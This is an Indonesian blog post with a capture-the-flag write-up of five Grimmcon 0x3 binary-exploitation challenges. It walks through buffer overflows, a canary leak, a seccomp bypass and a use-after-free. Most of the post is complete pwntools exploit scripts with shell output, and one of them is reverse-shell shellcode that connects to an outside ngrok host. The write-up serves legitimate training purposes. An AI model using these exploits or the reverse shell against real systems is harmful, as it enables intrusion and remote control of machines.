---
author: "abdullah"
layout: post
title: "Grimmcon 0x3 Write Up - PWN"
date: 2020-12-31 12:45:45 +0530
summary: "Tulisan ini akan menjadi sebuah *remainder* perjalanan saya yang *mungkin* sudah setengah tahun lebih saya mulai masuk ke-dunia CTF, hingga `alhamdullillah` menjadi juara dari beberapa ajang kompetisi CTF ditingkat pelajar. *Yaa,* masih ditingkat pelajar. Mengingat tahun depan sudah harus *~~kuliah-kerja-nyata~~* masuk universitas, dan mungkin saja akan *nugad*, *nugad*, dan *nugad* (sesuai rumor ditelinga saya)."
comments: true
categories:
  - WriteUp
  - PWN
---

Tulisan ini akan menjadi sebuah *remainder* perjalanan saya yang *mungkin* sudah setengah tahun lebih saya mulai masuk ke-dunia CTF, hingga `alhamdullillah` menjadi juara dari beberapa ajang kompetisi CTF ditingkat pelajar. *Yaa,* masih ditingkat pelajar. Mengingat tahun depan sudah harus *~~kuliah-kerja-nyata~~* masuk universitas, dan mungkin saja akan *nugad*, *nugad*, dan *nugad* (sesuai rumor ditelinga saya).

Singkat cerita, saya menemukan CTF ini dari channel youtube [John Hammond](https://youtube.com/c/JohnHammond010), yang secara tidak sengaja muncul diberanda saya. *Plus,* saya lihat diposisi pertama ada tim `AmpunBangJago` yang notabene merupakan suatu bahasa yang *hype* di Indonesia. yang mungkin saja orang Indonesia.

*\*source soal ada dibawah.*

# Stacked [489 pts]

Soal ini merupakan soal buffer-overflow, *plus* stack dalam kondisi *executable*. Mungkin saja inject shellcode diperlukan disini. 

## Overview

main func.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
    char *v3; // rax@17
    int optval; // [sp+1Ch] [bp-44h]@7
    struct sockaddr addr; // [sp+20h] [bp-40h]@17
    __int16 s; // [sp+30h] [bp-30h]@10
    uint16_t v7; // [sp+32h] [bp-2Eh]@10
    uint32_t v8; // [sp+34h] [bp-2Ch]@10
    socklen_t addr_len; // [sp+4Ch] [bp-14h]@16
    int v10; // [sp+50h] [bp-10h]@17
    int v11; // [sp+54h] [bp-Ch]@17
    int fd; // [sp+58h] [bp-8h]@4
    int v13; // [sp+5Ch] [bp-4h]@4

    if ( argc <= 1 )
    {
        fwrite("Not enough arguments.\n", 1uLL, 0x16uLL, _bss_start);
        fwrite("Usage: ./stacked [port]\n", 1uLL, 0x18uLL, _bss_start);
        exit(1);
    }
    v13 = atoi(argv[1]);
    fd = socket(2, 1, 0);
    if ( fd == -1 )
    {
        fwrite("Failed to create socket.\n", 1uLL, 0x19uLL, _bss_start);
        exit(1);
    }
    optval = 1;
    if ( setsockopt(fd, 1, 2, &optval, 4u) < 0 )
    {
        fwrite("Error setting socket options.\n", 1uLL, 0x1EuLL, _bss_start);
        exit(1);
    }
    bzero(&s, 0x10uLL);
    s = 2;
    v8 = htonl(0);
    v7 = htons(v13);
    if ( bind(fd, (const struct sockaddr *)&s, 0x10u) )
    {
        fwrite("Failed to bind socked.\n", 1uLL, 0x17uLL, _bss_start);
        exit(1);
    }
    if ( listen(fd, 5) )
    {
        fwrite("Failed to listen.\n", 1uLL, 0x12uLL, _bss_start);
        exit(1);
    }
    fprintf(_bss_start, "Listening on port %d...\n", (unsigned int)v13, argv);
    addr_len = 16;
    while ( 1 )
    {
        v11 = accept(fd, &addr, &addr_len);
        v3 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
        fprintf(_bss_start, "Received connection from: %s\n", v3);
        v10 = fork();
        if ( !v10 )
            break;
        close(v11);
    }
    handle_client(v11);
    close(v11);
    exit(0);
}
```

Fungsi main hanya melalukan listening ke localhost dengan port merupakan argument kedua. Lalu, untuk interaksi diproses pada fungsi handle_client.

```c {hl_lines=[3, 7]}
ssize_t __fastcall handle_client(int a1)
{
    char buf; // [sp+10h] [bp-400h]@1

    send(a1, "Overflow me!\n", 0xDuLL, 0);
    send(a1, "> ", 2uLL, 0);
    return recv(a1, &buf, 0x800uLL, 0);
}
```

Bug-nya terlihat jelas pada *handle_client* dimana user diberikan input sebesar 0x800 yang ditampung di variable buf, tetapi variable buf hanya berukuran 0x400.

## Exploit

Terdapat fungsi yang menarik disini, yaitu pada fungsi *useful*.

```c
.text:0000000000401557 useful       proc near
.text:0000000000401557              jmp     rsp
.text:0000000000401557 useful       endp
```

Karena kondisi stack executable, bisa jump ke shellcode kita dengan gadget diatas.

Oiya, karena interaksi dilakukan tidak langsung pada binarynya *child atau apalah belum terlalu paham istilahnya*, jika inject shellcode *execve* secara langsung, maka stdin, stdout akan masuk ke *parent*. Sementara kita berada diposisi yang berinteraksi dengan parent.

Solusinya adalah menggunakan *socketcall* syscall [[1]](https://medium.com/@chaudharyaditya/slae-0x2-linux-x86-reverse-shellcode-d7126d638aff)[[2]](https://barriersec.com/2018/11/linux-x86-reverse-shell-shellcode/), yaitu dengan menduplikasi stdin, stdout, dan stderr ke socket.

Full solver dengan bantuan shellcraft dari pwntools. 

```python
#!/usr/bin/python

from pwn import *

BINARY = './stacked'

elf = ELF(BINARY)
gdbscript = ''''''

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
    payload = 'a' * 0x408
    payload += p64(elf.sym['useful'])
    payload += asm(shellcraft.connect('4.tcp.ngrok.io', 15625))
    payload += asm(shellcraft.dup2("rbp", 0))
    payload += asm(shellcraft.dup2("rbp", 1))
    payload += asm(shellcraft.dup2("rbp", 2))
    payload += asm(shellcraft.sh())
    
    r.sendlineafter("> ", payload)
    r.interactive()

if __name__ == '__main__':
    context.arch = 'amd64'

    if len(sys.argv) > 1:
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)
```

profit.

```sh
$ nc -vlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from localhost 57362 received!
id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
ls -l 
total 24
-r--r--r-- 1 root root    39 Dec 29 15:37 flag.txt
---x--x--x 1 root root 17720 Dec 29 15:37 stacked
cat flag.txt
flag{e4fd4c9fcad9ba84666e5c7a4a9ab1f0}
```

## Flag

`flag{e4fd4c9fcad9ba84666e5c7a4a9ab1f0}`

<br>

# Patches Revenge [500pts]

Libc diberikan, berarti perlu *leak-meleak* disini. dan *mungkin* saja ret-to-libc (?)

## Main Function

Sangat singkat, write dan read. Dengan buffer-overflow di read.

```c {hl_lines=[3, 6]}
int __cdecl main(int argc, const char **argv, const char **envp)
{
    char buf; // [sp+0h] [bp-200h]@1

    write(1, &unk_402004, 2uLL);
    read(0, &buf, 0x400uLL);
    return 0;
}
```

## Information Leak

Ini merupakan binary x86_64 atau 64-bit. Parameter-parameter fungsi secara berurutan terletak pada register *rdi, rsi, rdx, rcx, r8, r9,* selebihnya di-*stack*.

Sementara, gadget untuk set rdi, rsi, rdx dalam binary ini tidak ditemukan. Dan untuk melakukan leak dengan fungsi *write*, diperlukan 3 parameter (rdi, rsi, rdx).

> ssize_t write(int fd, const void *buf, size_t count);

Ada suatu teknik yang bernama `ret-to-csu`[[1]](https://bananamafia.dev/post/x64-rop-redpwn/) yang dipresentasikan di Black Hat Asia 2018. Teknik ini didasari dari gadget yang ada didalam fungsi `__libc_csu_init()`. Saya tidak akan membahas ret-to-csu disini. Karena teknik ini tidak terlalu rumit juga, *plus* sudah banyak yang tau juga.

Full solver,

```python
#!/usr/bin/python

from pwn import *

ELF_PATH = './patches'

elf  = ELF(ELF_PATH)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', 0)

gdbscript = '''
    b *0x00000000004011B5
'''


def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

# 0x000000000040121A : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; mov rdi, 1 ; ret
# 0x0000000000401200 : mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call qword [r15 + rbx*8]

def exploit(r):
    payload = "a" * 0x208
    payload += p64(0x000000000040121A) 
    payload += p64(0x1) + p64(0x2)
    payload += p64(0x1) + p64(elf.got['read']) + p64(0x10) 
    payload += p64(elf.got['write'] - 8)
    payload += p64(0x0000000000401200)
    payload += p64(elf.sym['main']) * 8

    debug(gdbscript)

    r.sendlineafter("> ", payload)
    leak = u64(r.recv()[:8])
    libc.address = leak - libc.sym['read']

    info("LEAK 0x%x", leak)
    info("LIBC 0x%x", libc.address)

    payload = "a" * 0x208
    payload += p64(libc.address + 0x0000000000026b72) # pop rdi ; ret
    payload += p64(libc.search("/bin/sh").next())
    payload += p64(libc.address + 0x0000000000026b73) # ret for stack alignment
    payload += p64(libc.sym['system'])

    r.sendlineafter("> ", payload)
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        libc = ELF("./libc.so.6", 0)
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)
```

Setelah leak didapatkan, tinggal rop di libc.

```sh
$ python solver.py 31322
[*] '/home/abdullahnz/ctf/grimmcon/pwn/patches/patches'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.ctf.games on port 31322: Done
[*] LEAK 0x7fb3a62eb130
[*] LIBC 0x7fb3a61da000
[*] Switching to interactive mode
$ id
uid=1000(challenge) gid=1000 groups=1000
$ ls -l
total 48
drwxr-xr-x 1 root 0 12288 Dec 28 17:47 bin
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 dev
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 etc
-r--r--r-- 1 root 0    39 Dec 28 17:46 flag.txt
lrwxrwxrwx 1 root 0     7 Dec 28 17:46 lib -> usr/lib
lrwxrwxrwx 1 root 0     9 Dec 28 17:46 lib32 -> usr/lib32
lrwxrwxrwx 1 root 0     9 Dec 28 17:46 lib64 -> usr/lib64
lrwxrwxrwx 1 root 0    10 Dec 28 17:46 libx32 -> usr/libx32
---x--x--x 1 root 0 16856 Dec 28 17:46 patches_revenge
drwxr-xr-x 1 root 0  4096 Dec 28 17:46 usr
$ cat flag.txt
flag{499c6288c77f297f4fd87db8e442e3f0}
[*] Interrupted
[*] Closed connection to challenge.ctf.games port 31322
```

## Flag 

`flag{499c6288c77f297f4fd87db8e442e3f0}`


# Weird Cookie [500 pts]

## the main function

Intinya soal ini seperti pada judulnya. Dimana terdapat custom canary yang ditempatkan di variable setelah input buffer. Seperti canary pada umumnya, jika berubah, maka `__stack_chk_fail` akan dipanggil. Tetapi pada kasus ini, program akan exit.

```c {hl_lines=[7]}
int __cdecl main(int argc, const char **argv, const char **envp)
{
    char s; // [sp+0h] [bp-30h]@1
    unsigned __int64 v5; // [sp+28h] [bp-8h]@1

    setup(*(_QWORD *)&argc, argv, envp);
    v5 = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
    saved_canary = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
    memset(&s, 0, 0x28uLL);
    puts("Do you think you can overflow me?");
    read(0, &s, 0x40uLL);
    puts(&s);
    memset(&s, 0, 0x28uLL);
    puts("Are you sure you overflowed it right? Try again.");
    read(0, &s, 0x40uLL);
    if ( v5 != saved_canary )
    {
        puts("Nope. :(");
        exit(0);
    }
    return 0;
}
```

Canary merupakan hasil xor antara fungsi printf dan suatu nilai (katakan X).

Oke, karena input pakai read. Read itu tidak mengakhiri buffer dengan *nullbyte*. Nah, jika buffer sampai canary tidak mengandung *nullbyte*, maka, canary akan ikut ter-*puts* bersamaan dengan input buffer kita. Karena *puts* itu terminate dengan *nullbyte*.

Sebagai contoh, dibawah ini.

```shell
$ python -c 'print "a" * 0x27' | ./weird_cookie

00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
00000020  61 61 61 61 61 61 61 0a  d2 b1 18 6d 87 29 34 12  |aaaaaaaa...m.)4.|
00000030  90 52 55 55 55 55        ^^                       |.RUUUU|
[snip]
```

Karena xor mempunyai sifat yang reverseable, leak libc disini didapatkan dengan xor antara canary dengan nilai X tadi. Atau lebih jelasnya, 

> A ⊕ B = C dan C ⊕ B = A

Karena overflow hanya 24 byte, dan 16 byte untuk canary dan padding untuk sampai RIP. Jadi untuk ROP sendiri itu hanya 8 byte. Jadi, ret-to-libc dengan system disini tidak bisa dilakukan. Karena harus set parameter dulu yang butuh minimal 24 bytes.

Nah, karena versi libc yang dipakai server itu 2.27. Spray one_gadget disini bisa dilakukan. *Fyi*, semenjak saya masuk di libc 2.31, one_gadget hook tidak bisa dilakukan :'(.

Full solver,

```python
#!/usr/bin/python

from pwn import *

ELF_PATH = './weird_cookie'

elf  = ELF(ELF_PATH, 0)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so', 0)

gdbscript = ''''''

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
    payload = "a" * 0x28
    r.sendafter("?\n", payload)
    
    canary = u64(r.recvline(0)[0x28:0x30])
    printf = canary ^ 0x123456789ABCDEF1
    libc.address = printf - libc.sym['printf']

    info("LEAK 0x%x", printf)
    info("LIBC 0x%x", libc.address)

    payload += p64(canary)
    payload += p64(canary)
    payload += p64(libc.address + 0x4f432) # one_gadget

    r.sendafter(".\n", payload)
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)
```

Run and got the flag~.

```sh
$ python solver.py 30824
[+] Opening connection to challenge.ctf.games on port 30824: Done
[*] LEAK 0x7fec3b993f70
[*] LIBC 0x7fec3b92f000
[*] Switching to interactive mode
$ ls -l
total 48
drwxr-xr-x 1 root 0  4096 Dec 28 19:26 bin
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 dev
drwxr-xr-x 1 root 0  4096 Dec 28 19:26 etc
-r--r--r-- 1 root 0    39 Dec 28 19:25 flag.txt
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 lib
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 lib64
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 usr
---x--x--x 1 root 0 17000 Dec 28 19:25 weird_cookie
$ cat flag.txt
flag{e87923d7cd36a8580d0cf78656d457c6}
```

## Flag

`flag{e87923d7cd36a8580d0cf78656d457c6}`


# Sanded Box [500pts]

> I set up a secure environment for users to execute shellcode. Now nobody will be able to get the flag!

Disini diberi binary sandbox dan source code php yang akan menjalankan `./run_sanbox [file upload from user]`. Didalam sandbox, terdapat library seccomp yang digunakan untuk meng-handle syscall dari childnya.

```py
   
    line  CODE  JT   JF      K
    =================================
    0000: 0x20 0x00 0x00 0x00000004  A = arch
    0001: 0x20 0x00 0x00 0x00000000  A = sys_number
    0002: 0x25 0x0c 0x00 0x3fffffff  if (A > 0x3fffffff) goto 0015
    0003: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0015
    0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015
    0005: 0x15 0x09 0x00 0x00000038  if (A == clone) goto 0015
    0006: 0x15 0x08 0x00 0x00000039  if (A == fork) goto 0015
    0007: 0x15 0x07 0x00 0x0000003a  if (A == vfork) goto 0015
    0008: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0015
    0009: 0x15 0x05 0x00 0x00000055  if (A == creat) goto 0015
    0010: 0x15 0x04 0x00 0x00000101  if (A == openat) goto 0015
    0011: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0015
    0012: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0015
    0013: 0x15 0x01 0x00 0x00000011  if (A == pread64) goto 0015
    0014: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0016
    0015: 0x06 0x00 0x00 0x00000000  return KILL
    0016: 0x06 0x00 0x00 0x7fff0000  return ALLOW

```

Summary

- sys_number > 0x3fffffff, ini membuat syscall ABI tidak bisa digunakan.
- fungsi penting yaitu open, openat, execve, execveat, read, terblacklist. Jadi open/read/write dan rce tidak bisa dilakukan.
- selainnya, belum baca-baca lagi gan :v

Cara-cara seperti menggunakan syscall ABI, syscall orw tidak bisa dilakukan.

Ada instruksi yang bernama `far return` atau biasa dikenal dengan `retf`. Intruksi ini akan pop 2 value, yaitu di *cs* dan *ip*. Jika value *cs* ini 0x23, maka program akan return ke "32 bit mode". Kalau cs init 0x33, program return ke "64 bit mode". Dengan mengubah cs menjadi 0x23, maka kita bisa menjalankan syscall 32 bit diproses 64 bit.

Nah ini cukup mem-*bypass* filter-filter diatas. Karena *syscall_number* di 32 bit itu beda sama 64 bit. Syscall number dari execve pada 32 bit itu adalah 11. Dan itu terblacklist juga di binary sandbox. Solusinya adalah open/read/write file flag. Letak flag bisa didapatkan dalam Dockerfile.

Full solver,

```python
#!/usr/bin/python

from pwn import *

context.arch = 'amd64'

# set cs=0x23 ; rip=next to shellcode
shellcode = '''
    sub rbp, 0xff8
    mov rsp, rbp
    add rsp, 0x10
    push 0x23
    sub rsp, 0x4
    add rdi, 0x1d
    add [rsp], rdi
    retf
'''
# sys_open(str_flag, 0, 0)
shellcode += '''
    push 0x74
    push 0x78742e67
    push 0x616c662f
    mov eax, 5
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
'''
# sys_read('eax', str_flag, 0x50)
shellcode += '''
    mov ebx, eax
    mov ecx, esp
    mov edx, 0x50
    mov eax, 3
    int 0x80
'''
# sys_write(1, 'esp', 0x50)
shellcode += '''
    mov eax, 4
    mov ebx, 1
    mov ecx, esp
    mov edx, 0x50
    int 0x80
'''

def upload_file(raw):
    u = 'http://challenge.ctf.games:32039/upload.php'
    a = {'fileToUpload' : ['solver.bin', raw]}
    b = {'submit' : 'Upload File'}
    c = requests.post(u, files=a, data=b)
    return c.text

import requests
import re

shellcode = asm(shellcode)
response  = upload_file(shellcode)
flag = re.search("flag{.*}", response).group()

print flag
```


## Flag

`flag{dc75c408f5ba2fbc72b307987dddc775}`


# WAF [500pts]

> Not to be confused with Web Application Firewall.

Ini merupakan soal the least solves with 1 solve. Ya, hanya 1 yang menyelesaikan. Bug pada soal ini menyangkut use-after-free klasik yang tidak terlalu rumit. Asumsi saya mengapa tidak banyak yang menyelesaikan soal ini adalah mungkin banyak tim yang terlalu memikir jauh tentang exploitasi soal ini.

## Structure

Kira-kira, struktur data-nya *begini*,

```c
struct Config {
    int id;
    char *setting;
    char is_active;
}
```

## Add Config

Difungsi ini, hanya input id, size, lalu setting config diallokasikan menggunakan *malloc*.

```c
__int64 __fastcall add_config(__int64 a1)
{
    const char *v1; // rbx@1
    char v3; // [sp+1Bh] [bp-35h]@1
    int n; // [sp+1Ch] [bp-34h]@1
    char s; // [sp+20h] [bp-30h]@1
    __int64 v6; // [sp+38h] [bp-18h]@1

    v6 = *MK_FP(__FS__, 40LL);
    printf("What is the id of the config?: ");
    fgets(&s, 16, stdin);
    *(_DWORD *)a1 = atoi(&s);
    memset(&s, 0, 0x10uLL);
    printf("What is the size of the setting?: ", 0LL);
    fgets(&s, 16, stdin);
    n = atoi(&s);
    *(_QWORD *)(a1 + 8) = malloc(n);
    printf("What is the setting to be added?: ", 16LL);
    fgets(*(char **)(a1 + 8), n, stdin);
    v1 = *(const char **)(a1 + 8);
    v1[strcspn(v1, "\r\n")] = 0;
    printf("Should this setting be active? [y/n]: ", "\r\n");
    __isoc99_scanf(" %c", &v3);
    getchar();
    *(_BYTE *)(a1 + 16) = v3 == 121;
    puts("\nConfig added.\n");
    return v6 - *MK_FP(__FS__, 40LL);
}
```

## Edit Config

Realloc data yang sudah diallokasikan, berdasarkan index config.

```c
__int64 __fastcall edit_config(__int64 a1, int a2)
{
    int *v2; // rbx@1
    __int64 v3; // rbx@1
    __int64 v4; // rsi@1
    const char *v5; // rbx@1
    int v7; // [sp+4h] [bp-4Ch]@1
    char v8; // [sp+1Bh] [bp-35h]@1
    int n; // [sp+1Ch] [bp-34h]@1
    char s; // [sp+20h] [bp-30h]@1
    __int64 v11; // [sp+38h] [bp-18h]@1

    v7 = a2;
    v11 = *MK_FP(__FS__, 40LL);
    printf("What is the new ID?: ");
    fgets(&s, 16, stdin);
    v2 = *(8LL * a2 + a1);
    *v2 = atoi(&s);
    memset(&s, 0, 0x10uLL);
    printf("What is the new size of the setting?: ", 0LL);
    fgets(&s, 16, stdin);
    n = atoi(&s);
    v3 = *(8LL * a2 + a1);
    v4 = n;
    *(v3 + 8) = realloc(*(*(8LL * v7 + a1) + 8LL), n);
    printf("What is the new setting?: ", v4);
    fgets(*(*(8LL * v7 + a1) + 8LL), n, stdin);
    v5 = *(*(8LL * v7 + a1) + 8LL);
    v5[strcspn(v5, "\r\n")] = 0;
    printf("Should this be active? [y/n]: ", "\r\n");
    __isoc99_scanf(" %c", &v8);
    getchar();
    *(*(8LL * v7 + a1) + 16LL) = v8 == 121;
    putchar(10);
    puts("Config Edited.");
    return v11 - *MK_FP(__FS__, 40LL);
}
```

## Print Config

Hanya melakukan printing data-data config yang sudah dialokasikan.

```c
int __fastcall print_config(__int64 a1, int a2)
{
    putchar(10);
    printf("ID: %d\n", **(8LL * a2 + a1));
    printf("Setting: %s\n", *(*(8LL * a2 + a1) + 8LL));
    printf("Is active: %d\n", *(*(8LL * a2 + a1) + 16LL));
    return putchar(10);
}
```

## Remove Last

Melakukan *free* terhadap data yang terakhir kali dialokasikan.


## Bug

Ya, bug-nya terdapat di edit dan print. Disana tidak ada pengecekan bahwa data sudah di free atau belum. Ini menimbulkan *use-after-free*. Tapi use-after-free disini terhadap index yang terakhir di-free. Sebagai contoh: 

```
$ ./waf 
Web Application Firewall Configuration.

1. Add new configuration.
2. Edit configuration.
3. Print configuration.
4. Remove last added configuration.
5. Print all configurations.
6. Exit

> 1
What is the id of the config?: 0
What is the size of the setting?: 40
What is the setting to be added?: AAAAAAAA
Should this setting be active? [y/n]: n

Config added.

1. Add new configuration.
2. Edit configuration.
3. Print configuration.
4. Remove last added configuration.
5. Print all configurations.
6. Exit

> 1
What is the id of the config?: 1
What is the size of the setting?: 40
What is the setting to be added?: BBBBBBBB
Should this setting be active? [y/n]: n

Config added.

1. Add new configuration.
2. Edit configuration.
3. Print configuration.
4. Remove last added configuration.
5. Print all configurations.
6. Exit

> 4
Last config removed.

1. Add new configuration.
2. Edit configuration.
3. Print configuration.
4. Remove last added configuration.
5. Print all configurations.
6. Exit

> 4
Last config removed.

1. Add new configuration.
2. Edit configuration.
3. Print configuration.
4. Remove last added configuration.
5. Print all configurations.
6. Exit

> 3
What is the index of the config to print?: 0

ID: 4215472    <- LEAK
Setting:     <- LEAK
Is active: 0
```

## Information Leak.

Leak bisa didapatkan dengan memenuhi *tcache-bin*. Yaitu dengan alloc 7 chunks, lalu free semuanya. Nah chunk terakhir ini akan berisi sisa-sisa pointer *unsorted-bin* yang berisi alamat *main_arena*. Nah karena *main_arena* itu letaknya di-libc, maka dengan *use-after-free* yaitu dengan print index ini akan mendapatkan libc leak!

Setelah itu, tinggal *tcache poisoning*. Overwrite `__free_hook` dengan `system`. Free chunk yang menyimpan string "/bin/sh" untuk mendapatkan RCE.

Full solver,

```python
#!/usr/bin/python

from pwn import *

ELF_PATH = './waf'

elf  = ELF(ELF_PATH, 0)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so', 0)

gdbscript = ''''''

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def add(id, size, data, isactive="y"):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(id))
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', str(data))
    r.sendlineafter(': ', isactive)

def edit(idx, id, size, data, isactive="y"):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(id))
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', str(data))
    r.sendlineafter(': ', isactive)

def view(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))
    r.recvline(0)
    arr = []
    for _ in range(3):
        arr.append(r.recvline(0).split(": ")[1])
    return arr

def delete_last():
    r.sendlineafter('> ', '4')

def exploit(r):
    for i in range(8):
        add(i, 0x80, "a"*8)

    for i in range(8):
        delete_last()

    leak = u64(view(0)[1].ljust(8, '\0'))
    libc.address = leak - 4111520

    info("LEAK 0x%x", leak)
    info("LIBC 0x%x", libc.address)
    
    # just for clean bins. actually just need 1 freed chunk -> edit (uaf)
    for i in range(8):
        add(i, 0x80, "a"*8)

    delete_last() # 7

    edit(7, 1337, 0x80, p64(libc.sym['__free_hook']+1)*2)
    add(8, 0xc0, "d"*0x40) # need this
    add(9, 0xc0, p64(libc.sym['system']))
    add(10, 0x8, "/bin/sh")

    delete_last() # trigger system

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)
```

profit.

```sh
[+] Opening connection to challenge.ctf.games on port 31213: Done
[*] LEAK 0x7f6fb0456ca0
[*] LIBC 0x7f6fb006b000
[*] Switching to interactive mode
$ ls -l
total 48
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 bin
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 dev
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 etc
-r--r--r-- 1 root 0    39 Dec 28 17:46 flag.txt
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 lib
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 lib64
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 usr
---x--x--x 1 root 0 17344 Dec 28 17:46 waf
$ cat flag.txt
flag{dc75c408f5ba2fbc72b307987dddc775}

[*] Interrupted
[*] Closed connection to challenge.ctf.games port 31213
```

## Flag 

`flag{dc75c408f5ba2fbc72b307987dddc775}`


Akhir kata, nice challanges *buat aku*. Source soal dan solver bisa di download [disini](../source/source.zip), thanks.